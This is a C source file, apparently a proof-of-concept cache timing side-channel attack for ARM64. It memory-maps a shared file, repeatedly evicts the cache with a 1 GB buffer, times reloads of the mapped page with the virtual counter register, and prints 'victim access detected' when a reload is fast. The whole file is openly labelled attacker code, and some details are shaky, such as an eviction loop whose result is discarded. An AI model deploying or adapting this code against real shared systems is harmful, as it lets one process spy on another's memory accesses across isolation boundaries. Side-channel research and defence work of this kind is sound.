#include <stdint.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>

uint64_t rdtsc(void) {
	uint64_t val;
	asm volatile("mrs %0, cntvct_el0" : "=r" (val));
	return val; 
}

#define EVICT_SIZE (1024*1024*1024)
uint8_t evict_buffer[EVICT_SIZE];

void evict_target(void) {
	uint8_t sum = 0;
	for (int i=0; i<EVICT_SIZE; i++) {
		sum += evict_buffer[i];
	}
}

int main(void) {
	const char* file_path = "shared_target.bin";
	int fd = open(file_path, O_RDONLY);
	
	unsigned char* addr = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd, 0);

	uint64_t start, end, t_hit, t_miss;

	uint64_t threshold = 6;
	uint64_t diff = 0;
	printf("attacker started scanning with threshold: %lu..\n", threshold);
	while(1) {
		evict_target();
		
		printf("sleep check. Previous diff: %lu\n", diff);		
		usleep(1000);

		uint64_t start = rdtsc();
		asm volatile ("isb; dsb sy");
		volatile uint8_t dummy = addr[0];
		asm volatile ("isb; dsb sy");
		uint64_t end = rdtsc();
		diff = end - start;
		
		if (diff < threshold) {
			printf("victim access detected. time: %li\n", diff);
		}
	}
	munmap(addr, 4096);
	close(fd);
	return 0;
}

